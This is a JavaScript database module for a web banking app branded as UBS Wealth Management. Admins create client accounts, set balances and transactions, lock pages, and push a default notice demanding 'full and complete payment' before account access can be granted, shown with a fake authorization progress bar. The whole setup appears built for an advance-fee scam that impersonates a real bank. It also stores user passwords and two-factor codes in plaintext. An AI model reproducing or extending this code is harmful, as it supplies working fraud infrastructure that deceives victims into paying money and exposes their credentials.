import path from 'path';
import fs from 'fs-extra';
import { createClient } from '@libsql/client';

const DATA_DIR = path.join(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'bankData.json');
const SQLITE_FILE = path.join(DATA_DIR, 'bank.db');

// Turso Cloud or Local SQLite file fallback
function cleanEnvValue(val) {
  if (!val || typeof val !== 'string') return '';
  let trimmed = val.trim();
  if ((trimmed.startsWith('"') && trimmed.endsWith('"')) || (trimmed.startsWith("'") && trimmed.endsWith("'"))) {
    trimmed = trimmed.slice(1, -1).trim();
  }
  return trimmed;
}

let client = null;

function resolveTursoConfig() {
  // PERMANENT_DB_* take priority: they point to ONE fixed database that never changes between deployments.
  // (Vercel's Turso integration can inject a brand-new per-deployment database into TURSO_DATABASE_URL.)
  let rawUrl =
    process.env.PERMANENT_DB_URL ||
    process.env.TURSO_DATABASE_URL ||
    process.env.TURSO_DB_URL ||
    process.env.DATABASE_URL ||
    process.env.LIBSQL_URL ||
    '';
  let rawToken =
    process.env.PERMANENT_DB_TOKEN ||
    process.env.TURSO_AUTH_TOKEN ||
    process.env.TURSO_DB_AUTH_TOKEN ||
    process.env.DATABASE_AUTH_TOKEN ||
    process.env.LIBSQL_AUTH_TOKEN ||
    '';

  // Auto-discover custom-prefixed Vercel Storage Turso variables (e.g. STORAGE_TURSO_DATABASE_URL)
  if (!rawUrl && typeof process !== 'undefined' && process.env) {
    const envKeys = Object.keys(process.env);
    const urlKey = envKeys.find(
      (k) =>
        (k.endsWith('_TURSO_DATABASE_URL') || k.endsWith('_DATABASE_URL') || k.endsWith('_LIBSQL_URL')) &&
        process.env[k] &&
        (String(process.env[k]).includes('turso.io') || String(process.env[k]).startsWith('libsql://'))
    );
    if (urlKey) {
      rawUrl = process.env[urlKey];
      const prefix = urlKey.replace(/(TURSO_DATABASE_URL|DATABASE_URL|LIBSQL_URL)$/, '');
      const tokenCandidate =
        process.env[`${prefix}TURSO_AUTH_TOKEN`] ||
        process.env[`${prefix}AUTH_TOKEN`] ||
        process.env[`${prefix}DATABASE_AUTH_TOKEN`];
      if (tokenCandidate) {
        rawToken = tokenCandidate;
      }
    }
  }

  return {
    tursoUrl: cleanEnvValue(rawUrl),
    tursoToken: cleanEnvValue(rawToken),
  };
}

export function getDbClient() {
  if (!client) {
    try {
      fs.ensureDirSync(DATA_DIR);
    } catch (_) { }

    const { tursoUrl, tursoToken } = resolveTursoConfig();

    const isCloud = tursoUrl && tursoUrl !== '' && !tursoUrl.startsWith('file:');
    // Use HTTPS transport instead of WebSockets: far more reliable on serverless platforms like Vercel
    const dbUrl = isCloud
      ? tursoUrl.replace(/^libsql:\/\//i, 'https://')
      : `file:${SQLITE_FILE.replace(/\\/g, '/')}`;

    if (!isCloud && process.env.NODE_ENV === 'production') {
      console.warn(
        '[PremiumBank DB Warning] Running in production without TURSO_DATABASE_URL configured. Falling back to ephemeral local SQLite file.'
      );
    }

    client = createClient({
      url: dbUrl,
      authToken: isCloud && tursoToken ? tursoToken : undefined,
    });
  }
  return client;
}

export const INITIAL_DATA = {
  users: [],
  accounts: [],
  transactions: []
};

import {
  ALL_NAVIGATION_MENUS,
  ALL_MENU_IDS,
  DEFAULT_CORE_MENU_IDS,
  normalizeMenuIds,
  DEFAULT_ADMIN_PERMISSIONS,
  normalizeAdminPermissions,
} from './navigationConfig.js';

export const DEFAULT_NOTICE = {
  enabled: false,
  showPopup: true,
  sendAsMessage: false,
  subject: "Official Account & Compliance Notice",
  sender: "UBS Wealth Management & Compliance",
  category: "Notices",
  sentAt: "",
  message: "Notice: Please note that full and complete payment is required before access and authorization to your online account and credit card can be granted. Kindly ensure all outstanding balances are settled to avoid delays.",
  progress: 65,
  progressStatus: "65% • Action Required",
  progressLabel: "Authorization Progress",
  messages: [],
};

export const ALL_PAGES = ALL_NAVIGATION_MENUS;
export const DEFAULT_ALLOWED_PAGES = ALL_MENU_IDS;
export const normalizePagesList = normalizeMenuIds;

function mapUserRow(row) {
  let notice = DEFAULT_NOTICE;
  if (row.notice) {
    try {
      notice = typeof row.notice === 'string' ? JSON.parse(row.notice) : row.notice;
    } catch (_) {
      notice = DEFAULT_NOTICE;
    }
  }

  let allowedPages = DEFAULT_ALLOWED_PAGES;
  if (row.allowedPages !== undefined && row.allowedPages !== null) {
    try {
      const parsed = typeof row.allowedPages === 'string' ? JSON.parse(row.allowedPages) : row.allowedPages;
      if (Array.isArray(parsed)) {
        allowedPages = normalizePagesList(parsed);
      }
    } catch (_) {
      allowedPages = DEFAULT_ALLOWED_PAGES;
    }
  }

  let lockedPages = [];
  if (row.lockedPages) {
    try {
      const parsed = typeof row.lockedPages === 'string' ? JSON.parse(row.lockedPages) : row.lockedPages;
      if (Array.isArray(parsed)) {
        lockedPages = normalizePagesList(parsed);
      }
    } catch (_) {
      lockedPages = [];
    }
  }

  let adminPermissions = DEFAULT_ADMIN_PERMISSIONS;
  if (row.adminPermissions) {
    try {
      const parsed = typeof row.adminPermissions === 'string' ? JSON.parse(row.adminPermissions) : row.adminPermissions;
      adminPermissions = normalizeAdminPermissions(parsed);
    } catch (_) {
      adminPermissions = DEFAULT_ADMIN_PERMISSIONS;
    }
  }

  return {
    id: String(row.id),
    name: String(row.name),
    email: String(row.email),
    password: String(row.password),
    twoFactorCode: row.twoFactorCode ? String(row.twoFactorCode) : '',
    role: row.role ? String(row.role) : 'user',
    status: row.status ? String(row.status) : 'active',
    phone: row.phone ? String(row.phone) : '',
    address: row.address ? String(row.address) : '',
    createdAt: row.createdAt ? String(row.createdAt) : '',
    notice,
    allowedPages,
    lockedPages,
    tokenVersion: Number(row.tokenVersion) || 1,
    createdByAdminId: row.createdByAdminId ? String(row.createdByAdminId) : '',
    createdByAdminName: row.createdByAdminName ? String(row.createdByAdminName) : '',
    adminPermissions,
  };
}

function mapAccountRow(row) {
  return {
    id: String(row.id),
    userId: String(row.userId),
    userName: String(row.userName || ''),
    accountNumber: String(row.accountNumber || ''),
    fullAccountNumber: String(row.fullAccountNumber || ''),
    routingNumber: String(row.routingNumber || ''),
    type: String(row.type || 'Checking'),
    balance: Number(row.balance) || 0,
    status: String(row.status || 'active'),
  };
}

function mapTxRow(row) {
  return {
    id: String(row.id),
    userId: String(row.userId),
    userName: String(row.userName || ''),
    accountNumber: String(row.accountNumber || ''),
    type: String(row.type || 'debit'),
    description: String(row.description || ''),
    amount: Number(row.amount) || 0,
    date: String(row.date || ''),
    time: String(row.time || ''),
    category: String(row.category || 'Transfer'),
    status: String(row.status || 'completed'),
  };
}

let isInitialized = false;
let initPromise = null;

export async function ensureDbInitialized() {
  if (isInitialized) return;
  if (initPromise) return initPromise;

  initPromise = (async () => {
    try {
      const db = getDbClient();

      // Batch all CREATE TABLE IF NOT EXISTS into a single network round-trip for fast serverless cold starts
      await db.batch([
        `CREATE TABLE IF NOT EXISTS users (
          id TEXT PRIMARY KEY,
          name TEXT NOT NULL,
          email TEXT UNIQUE NOT NULL,
          password TEXT NOT NULL,
          twoFactorCode TEXT,
          role TEXT DEFAULT 'user',
          status TEXT DEFAULT 'active',
          phone TEXT,
          address TEXT,
          createdAt TEXT,
          notice TEXT,
          allowedPages TEXT,
          lockedPages TEXT DEFAULT '[]',
          tokenVersion INTEGER DEFAULT 1,
          createdByAdminId TEXT DEFAULT '',
          createdByAdminName TEXT DEFAULT '',
          adminPermissions TEXT DEFAULT '{}'
        )`,
        `CREATE TABLE IF NOT EXISTS accounts (
          id TEXT PRIMARY KEY,
          userId TEXT NOT NULL,
          userName TEXT,
          accountNumber TEXT,
          fullAccountNumber TEXT,
          routingNumber TEXT,
          type TEXT,
          balance REAL DEFAULT 0,
          status TEXT DEFAULT 'active'
        )`,
        `CREATE TABLE IF NOT EXISTS transactions (
          id TEXT PRIMARY KEY,
          userId TEXT NOT NULL,
          userName TEXT,
          accountNumber TEXT,
          type TEXT,
          description TEXT,
          amount REAL,
          date TEXT,
          time TEXT,
          category TEXT,
          status TEXT
        )`,
        `CREATE TABLE IF NOT EXISTS rate_limits (
          key TEXT PRIMARY KEY,
          attempts TEXT DEFAULT '[]',
          updatedAt INTEGER DEFAULT 0
        )`,
        `CREATE TABLE IF NOT EXISTS security_meta (
          key TEXT PRIMARY KEY,
          value TEXT,
          updatedAt INTEGER DEFAULT 0
        )`,
        `CREATE TABLE IF NOT EXISTS support_chats (
          userId TEXT PRIMARY KEY,
          corporateEmail TEXT DEFAULT 'concierge.desk@ubs-privatebanking.com',
          advisorName TEXT DEFAULT 'UBS Private Wealth Concierge Desk',
          messages TEXT DEFAULT '[]',
          updatedAt INTEGER DEFAULT 0
        )`,
      ]);

      // Lightweight column check on users table so we only run ALTER TABLE if an older schema is detected
      try {
        const tableInfo = await db.execute('PRAGMA table_info(users)');
        const existingCols = new Set((tableInfo.rows || []).map((r) => String(r.name)));
        const alterStmts = [];
        if (!existingCols.has('tokenVersion')) {
          alterStmts.push('ALTER TABLE users ADD COLUMN tokenVersion INTEGER DEFAULT 1');
        }
        if (!existingCols.has('lockedPages')) {
          alterStmts.push("ALTER TABLE users ADD COLUMN lockedPages TEXT DEFAULT '[]'");
        }
        if (!existingCols.has('createdByAdminId')) {
          alterStmts.push("ALTER TABLE users ADD COLUMN createdByAdminId TEXT DEFAULT ''");
        }
        if (!existingCols.has('createdByAdminName')) {
          alterStmts.push("ALTER TABLE users ADD COLUMN createdByAdminName TEXT DEFAULT ''");
        }
        if (!existingCols.has('adminPermissions')) {
          alterStmts.push("ALTER TABLE users ADD COLUMN adminPermissions TEXT DEFAULT '{}'");
        }
        for (const stmt of alterStmts) {
          try {
            await db.execute(stmt);
          } catch (_) { }
        }
      } catch (_) { }

      isInitialized = true;
    } catch (err) {
      console.error('Error initializing Turso/SQLite database schema:', err);
      throw new Error(`Database initialization failed: ${err?.message || err}`);
    } finally {
      initPromise = null;
    }
  })();

  return initPromise;
}

async function queryAllBankTables(db) {
  const [usersRes, accountsRes, txsRes, metaRes] = await Promise.all([
    db.execute('SELECT * FROM users'),
    db.execute('SELECT * FROM accounts'),
    db.execute('SELECT * FROM transactions ORDER BY date DESC, time DESC'),
    db.execute("SELECT value FROM security_meta WHERE key = 'superadmin_token_version' LIMIT 1").catch(() => ({ rows: [] })),
  ]);

  const users = usersRes.rows.map(mapUserRow);
  const accounts = accountsRes.rows.map(mapAccountRow);
  const transactions = txsRes.rows.map(mapTxRow);
  const superAdminTokenVersion =
    metaRes?.rows?.length > 0 ? Number(metaRes.rows[0].value) || 1 : 1;

  return { users, accounts, transactions, superAdminTokenVersion, _fromDb: true };
}

export async function getBankData() {
  await ensureDbInitialized();
  const db = getDbClient();

  try {
    const bankData = await queryAllBankTables(db);
    globalThis.__BANK_DATA__ = bankData;
    return bankData;
  } catch (firstErr) {
    console.warn('Transient error fetching bank data from Turso/SQLite, retrying once:', firstErr?.message || firstErr);
    try {
      await new Promise((r) => setTimeout(r, 250));
      const bankData = await queryAllBankTables(db);
      globalThis.__BANK_DATA__ = bankData;
      return bankData;
    } catch (err) {
      console.error('Error fetching bank data from Turso/SQLite after retry:', err);
      // Fail loudly: never serve fake/in-memory data that would be lost on the next deploy
      throw new Error(`Database read failed: ${err?.message || err}`);
    }
  }
}

export async function saveBankData(data) {
  if (!data || data._readFailed) {
    console.error('[PremiumBank DB Safety Lock] Refusing to saveBankData because the preceding database read failed.');
    return false;
  }

  await ensureDbInitialized();
  let saved = false;

  try {
    const db = getDbClient();
    const statements = [];

    // Upsert users safely using INSERT OR REPLACE (NEVER run table-wide DELETE FROM users)
    for (const user of (data.users || [])) {
      if (!user || !user.id || !user.email) continue;
      const cleanAllowed = Array.isArray(user.allowedPages) ? normalizePagesList(user.allowedPages) : DEFAULT_ALLOWED_PAGES;
      const cleanLocked = Array.isArray(user.lockedPages) ? normalizePagesList(user.lockedPages) : [];
      const cleanAdminPerms = normalizeAdminPermissions(user.adminPermissions);
      statements.push({
        sql: `INSERT OR REPLACE INTO users (id, name, email, password, twoFactorCode, role, status, phone, address, createdAt, notice, allowedPages, lockedPages, tokenVersion, createdByAdminId, createdByAdminName, adminPermissions)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        args: [
          user.id,
          user.name,
          user.email,
          user.password,
          user.twoFactorCode || '',
          user.role || 'user',
          user.status || 'active',
          user.phone || '',
          user.address || '',
          user.createdAt || new Date().toISOString().split('T')[0],
          JSON.stringify(user.notice || DEFAULT_NOTICE),
          JSON.stringify(cleanAllowed),
          JSON.stringify(cleanLocked),
          user.tokenVersion || 1,
          user.createdByAdminId || '',
          user.createdByAdminName || '',
          JSON.stringify(cleanAdminPerms),
        ],
      });
    }

    // Upsert accounts safely using INSERT OR REPLACE (NEVER run table-wide DELETE FROM accounts)
    for (const acc of (data.accounts || [])) {
      if (!acc || !acc.id) continue;
      statements.push({
        sql: `INSERT OR REPLACE INTO accounts (id, userId, userName, accountNumber, fullAccountNumber, routingNumber, type, balance, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        args: [
          acc.id,
          acc.userId,
          acc.userName || '',
          acc.accountNumber || '',
          acc.fullAccountNumber || '',
          acc.routingNumber || '',
          acc.type || 'Checking',
          Number(acc.balance) || 0,
          acc.status || 'active',
        ],
      });
    }

    // Upsert transactions safely using INSERT OR REPLACE (NEVER run table-wide DELETE FROM transactions)
    for (const tx of (data.transactions || [])) {
      if (!tx || !tx.id) continue;
      statements.push({
        sql: `INSERT OR REPLACE INTO transactions (id, userId, userName, accountNumber, type, description, amount, date, time, category, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        args: [
          tx.id,
          tx.userId,
          tx.userName || '',
          tx.accountNumber || '',
          tx.type || 'debit',
          tx.description || '',
          Number(tx.amount) || 0,
          tx.date || '',
          tx.time || '',
          tx.category || 'Transfer',
          tx.status || 'completed',
        ],
      });
    }

    if (statements.length > 0) {
      await db.batch(statements, 'write');
    }
    saved = true;
  } catch (err) {
    console.error('Error saving bank data to Turso/SQLite:', err);
    // Fail loudly so the admin UI never shows a fake "success" for data that was not persisted
    throw new Error(`Database write failed: ${err?.message || err}`);
  }

  try {
    await fs.ensureDir(DATA_DIR);
    await fs.writeJson(DATA_FILE, data, { spaces: 2 });
  } catch (_) { }

  return saved;
}

/**
 * Explicitly deletes a single client user and their associated accounts & transactions by ID.
 */
export async function deleteUserFromDb(userId) {
  if (!userId) return false;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    await db.batch(
      [
        { sql: 'DELETE FROM users WHERE id = ?', args: [userId] },
        { sql: 'DELETE FROM accounts WHERE userId = ?', args: [userId] },
        { sql: 'DELETE FROM transactions WHERE userId = ?', args: [userId] },
        { sql: 'DELETE FROM support_chats WHERE userId = ?', args: [userId] },
      ],
      'write'
    );
    return true;
  } catch (err) {
    console.error('Error deleting user from Turso/SQLite:', err);
    return false;
  }
}

/**
 * Explicitly deletes a single admin and reassigns their onboarded users to Super Admin.
 */
export async function deleteAdminFromDb(adminId) {
  if (!adminId) return false;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    await db.batch(
      [
        { sql: "DELETE FROM users WHERE id = ? AND role = 'admin'", args: [adminId] },
        {
          sql: "UPDATE users SET createdByAdminId = 'admin-1', createdByAdminName = 'Super Administrator' WHERE createdByAdminId = ?",
          args: [adminId],
        },
      ],
      'write'
    );
    return true;
  } catch (err) {
    console.error('Error deleting admin from Turso/SQLite:', err);
    return false;
  }
}

/**
 * Explicitly deletes a single transaction by ID.
 */
export async function deleteTransactionFromDb(txId) {
  if (!txId) return false;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    await db.execute({ sql: 'DELETE FROM transactions WHERE id = ?', args: [txId] });
    return true;
  } catch (err) {
    console.error('Error deleting transaction from Turso/SQLite:', err);
    return false;
  }
}

/**
 * Atomically increments a single user or admin's tokenVersion in SQL without rewriting the database.
 */
export async function incrementUserTokenVersion(userId, email) {
  if (!userId && !email) return false;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    if (userId) {
      await db.execute({
        sql: 'UPDATE users SET tokenVersion = COALESCE(tokenVersion, 1) + 1 WHERE id = ?',
        args: [userId],
      });
    } else if (email) {
      await db.execute({
        sql: 'UPDATE users SET tokenVersion = COALESCE(tokenVersion, 1) + 1 WHERE LOWER(email) = LOWER(?)',
        args: [email.trim()],
      });
    }
    return true;
  } catch (err) {
    console.error('Error incrementing user tokenVersion in Turso/SQLite:', err);
    return false;
  }
}

export async function findUserByEmail(email) {
  if (!email) return null;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM users WHERE LOWER(email) = LOWER(?) LIMIT 1',
      args: [email.trim()],
    });
    if (res.rows.length > 0) {
      return mapUserRow(res.rows[0]);
    }
  } catch (err) {
    console.error('Error finding user by email in Turso/SQLite:', err);
    throw new Error(`Database read failed: ${err?.message || err}`);
  }
  return null;
}

export async function findUserById(id) {
  if (!id) return null;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM users WHERE id = ? LIMIT 1',
      args: [id],
    });
    if (res.rows.length > 0) {
      return mapUserRow(res.rows[0]);
    }
  } catch (err) {
    console.error('Error finding user by ID in Turso/SQLite:', err);
  }
  return null;
}

export async function getAccountsForUser(userId) {
  if (!userId) return [];
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM accounts WHERE userId = ?',
      args: [userId],
    });
    return res.rows.map(mapAccountRow);
  } catch (err) {
    console.error('Error getting accounts for user in Turso/SQLite:', err);
  }
  return [];
}

export async function getTransactionsForUser(userId) {
  if (!userId) return [];
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM transactions WHERE userId = ? ORDER BY date DESC, time DESC',
      args: [userId],
    });
    return res.rows.map(mapTxRow);
  } catch (err) {
    console.error('Error getting transactions for user in Turso/SQLite:', err);
  }
  return [];
}

export { DEFAULT_ADMIN_PERMISSIONS, normalizeAdminPermissions };

// -----------------------------------------------------------------------------
// Persistent Rate Limit & Security Metadata Helpers (Turso / SQLite)
// -----------------------------------------------------------------------------

export async function getPersistedRateLimit(key, windowMs = 15 * 60 * 1000) {
  if (!key) return [];
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT attempts FROM rate_limits WHERE key = ? LIMIT 1',
      args: [key],
    });
    if (res.rows.length === 0) return [];
    const parsed = JSON.parse(res.rows[0].attempts || '[]');
    if (!Array.isArray(parsed)) return [];
    const now = Date.now();
    const valid = parsed.filter((t) => typeof t === 'number' && now - t < windowMs);
    if (valid.length !== parsed.length) {
      if (valid.length === 0) {
        await db.execute({ sql: 'DELETE FROM rate_limits WHERE key = ?', args: [key] });
      } else {
        await db.execute({
          sql: 'INSERT OR REPLACE INTO rate_limits (key, attempts, updatedAt) VALUES (?, ?, ?)',
          args: [key, JSON.stringify(valid), now],
        });
      }
    }
    return valid;
  } catch (err) {
    console.error('Error reading persisted rate limit:', err);
    return [];
  }
}

export async function checkPersistedRateLimit(key, maxAttempts = 5, windowMs = 15 * 60 * 1000) {
  if (!key) return { allowed: true, remaining: maxAttempts, retryAfterSeconds: 0 };
  const now = Date.now();
  const validTimestamps = await getPersistedRateLimit(key, windowMs);
  if (validTimestamps.length >= maxAttempts) {
    const oldest = validTimestamps[0];
    const retryAfterSeconds = Math.max(1, Math.ceil((oldest + windowMs - now) / 1000));
    return {
      allowed: false,
      remaining: 0,
      retryAfterSeconds,
    };
  }
  return {
    allowed: true,
    remaining: maxAttempts - validTimestamps.length,
    retryAfterSeconds: 0,
  };
}

export async function recordPersistedFailedAttempt(key, windowMs = 15 * 60 * 1000) {
  if (!key) return;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const valid = await getPersistedRateLimit(key, windowMs);
    const now = Date.now();
    valid.push(now);
    await db.execute({
      sql: 'INSERT OR REPLACE INTO rate_limits (key, attempts, updatedAt) VALUES (?, ?, ?)',
      args: [key, JSON.stringify(valid), now],
    });
  } catch (err) {
    console.error('Error recording persisted failed attempt:', err);
  }
}

export async function clearPersistedRateLimit(key) {
  if (!key) return;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    await db.execute({
      sql: 'DELETE FROM rate_limits WHERE key = ?',
      args: [key],
    });
  } catch (err) {
    console.error('Error clearing persisted rate limit:', err);
  }
}

export async function getSuperAdminTokenVersion() {
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: "SELECT value FROM security_meta WHERE key = 'superadmin_token_version' LIMIT 1",
    });
    if (res.rows.length > 0) {
      return Number(res.rows[0].value) || 1;
    }
  } catch (err) {
    console.error('Error reading superadmin_token_version:', err);
  }
  return 1;
}

export async function incrementSuperAdminTokenVersion() {
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const current = await getSuperAdminTokenVersion();
    const nextVer = current + 1;
    await db.execute({
      sql: "INSERT OR REPLACE INTO security_meta (key, value, updatedAt) VALUES ('superadmin_token_version', ?, ?)",
      args: [String(nextVer), Date.now()],
    });
    return nextVer;
  } catch (err) {
    console.error('Error incrementing superadmin_token_version:', err);
    return 1;
  }
}

/**
 * Resolves live admin identity, status, permissions, and tenant scoping from bankData.
 */
export function resolveAdminContext(auth, data) {
  const session = auth?.session || (auth?.role ? auth : null);
  if (!session) {
    return { valid: false, status: 401, error: 'Unauthorized.' };
  }

  if (session.role === 'superadmin') {
    const sessionVer = Number(session.tokenVersion) || 1;
    const recordVer = Number(data?.superAdminTokenVersion) || 1;
    if (sessionVer < recordVer) {
      return {
        valid: false,
        status: 401,
        error: 'Super Administrator session has expired or been revoked. Please sign in again.',
      };
    }

    return {
      valid: true,
      isSuperAdmin: true,
      adminId: session.id || 'admin-1',
      adminName: session.name || 'Super Administrator',
      adminEmail: session.email || '',
      permissions: { ...DEFAULT_ADMIN_PERMISSIONS },
      hasPerm: () => true,
      canAccessUser: (u) => Boolean(u && u.role !== 'admin' && u.role !== 'superadmin'),
    };
  }

  if (session.role === 'admin') {
    const adminRecord = (data.users || []).find(
      (u) => u.role === 'admin' && (u.id === session.id || (session.email && u.email?.toLowerCase() === session.email.toLowerCase()))
    );

    if (!adminRecord) {
      return { valid: false, status: 401, error: 'Administrator account not found or removed by Super Admin.' };
    }

    const sessionVer = Number(session.tokenVersion) || 1;
    const recordVer = Number(adminRecord.tokenVersion) || 1;
    if (sessionVer < recordVer) {
      return { valid: false, status: 401, error: 'Your administrator session was terminated by Super Admin. Please sign in again.' };
    }

    if (['blocked', 'suspended', 'inactive'].includes(adminRecord.status)) {
      return { valid: false, status: 403, error: `Your administrator account is ${adminRecord.status}. Contact Super Admin.` };
    }

    const permissions = normalizeAdminPermissions(adminRecord.adminPermissions);
    return {
      valid: true,
      isSuperAdmin: false,
      adminId: adminRecord.id,
      adminName: adminRecord.name,
      adminEmail: adminRecord.email,
      permissions,
      hasPerm: (permId) => permissions[permId] !== false,
      canAccessUser: (u) => Boolean(u && u.role !== 'admin' && u.role !== 'superadmin' && String(u.createdByAdminId || '') === String(adminRecord.id)),
    };
  }

  return { valid: false, status: 403, error: 'Administrative privileges required.' };
}

// -----------------------------------------------------------------------------
// Support Chat & Corporate Email Persistence Helpers
// -----------------------------------------------------------------------------

export const DEFAULT_CORPORATE_EMAIL = 'concierge.desk@ubs-privatebanking.com';
export const DEFAULT_ADVISOR_NAME = 'UBS Private Wealth Concierge Desk';

function mapSupportChatRow(row, fallbackUserId = '') {
  if (!row) {
    return {
      userId: String(fallbackUserId || ''),
      corporateEmail: DEFAULT_CORPORATE_EMAIL,
      advisorName: DEFAULT_ADVISOR_NAME,
      messages: [],
      unreadByAdmin: 0,
      unreadByUser: 0,
      updatedAt: 0,
    };
  }
  let messages = [];
  if (row.messages) {
    try {
      const parsed = typeof row.messages === 'string' ? JSON.parse(row.messages) : row.messages;
      if (Array.isArray(parsed)) messages = parsed;
    } catch (_) {
      messages = [];
    }
  }
  const unreadByAdmin = messages.filter((m) => m.sender === 'user' && !m.readByAdmin).length;
  const unreadByUser = messages.filter((m) => m.sender === 'admin' && !m.readByUser).length;

  return {
    userId: String(row.userId || fallbackUserId),
    corporateEmail: row.corporateEmail ? String(row.corporateEmail).trim() : DEFAULT_CORPORATE_EMAIL,
    advisorName: row.advisorName ? String(row.advisorName).trim() : DEFAULT_ADVISOR_NAME,
    messages,
    unreadByAdmin,
    unreadByUser,
    updatedAt: Number(row.updatedAt) || 0,
  };
}

export async function getSupportChatForUser(userId) {
  if (!userId) return mapSupportChatRow(null, '');
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM support_chats WHERE userId = ? LIMIT 1',
      args: [String(userId)],
    });
    if (res.rows.length > 0) {
      return mapSupportChatRow(res.rows[0], userId);
    }
  } catch (err) {
    console.error('Error reading support chat for user:', err);
  }
  return mapSupportChatRow(null, userId);
}

export async function getAllSupportChatsMap() {
  await ensureDbInitialized();
  const map = {};
  try {
    const db = getDbClient();
    const res = await db.execute('SELECT * FROM support_chats');
    for (const row of res.rows || []) {
      const mapped = mapSupportChatRow(row);
      if (mapped.userId) {
        map[mapped.userId] = mapped;
      }
    }
  } catch (err) {
    console.error('Error reading all support chats:', err);
  }
  return map;
}

export async function saveSupportChatForUser(userId, payload = {}) {
  if (!userId) return null;
  await ensureDbInitialized();
  const current = await getSupportChatForUser(userId);
  const corporateEmail =
    payload.corporateEmail !== undefined && String(payload.corporateEmail).trim() !== ''
      ? String(payload.corporateEmail).trim()
      : current.corporateEmail || DEFAULT_CORPORATE_EMAIL;
  const advisorName =
    payload.advisorName !== undefined && String(payload.advisorName).trim() !== ''
      ? String(payload.advisorName).trim()
      : current.advisorName || DEFAULT_ADVISOR_NAME;
  const messages = Array.isArray(payload.messages) ? payload.messages : current.messages;
  const updatedAt = Date.now();

  try {
    const db = getDbClient();
    await db.execute({
      sql: `INSERT OR REPLACE INTO support_chats (userId, corporateEmail, advisorName, messages, updatedAt)
            VALUES (?, ?, ?, ?, ?)`,
      args: [String(userId), corporateEmail, advisorName, JSON.stringify(messages), updatedAt],
    });
  } catch (err) {
    console.error('Error saving support chat for user:', err);
    throw new Error(`Support chat write failed: ${err?.message || err}`);
  }

  return mapSupportChatRow(
    {
      userId: String(userId),
      corporateEmail,
      advisorName,
      messages,
      updatedAt,
    },
    userId
  );
}


